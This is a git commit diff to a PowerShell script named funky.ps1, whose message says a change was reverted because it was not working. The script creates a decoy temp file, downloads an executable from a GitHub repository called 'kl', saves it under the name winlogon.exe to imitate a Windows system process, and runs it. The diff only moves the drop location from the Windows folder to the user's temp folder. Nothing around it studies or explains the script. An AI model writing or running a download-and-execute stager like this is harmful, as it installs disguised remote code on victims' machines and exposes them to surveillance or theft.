dbd5362ad05984248691ade168b2ba94193ca938
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-11 17:01:53 -0600

    Changed it back because it wasn't working

--- funky.ps1
+++ funky.ps1
@@ -1,3 +1,3 @@
 New-Item "$env:temp\wsuA58F.tmp"
-(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "C:\Windows\winlogon.exe")
-cmd.exe /c "C:\Windows\winlogon.exe"
+(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\winlogon.exe")
+cmd.exe /c "$env:temp\winlogon.exe"
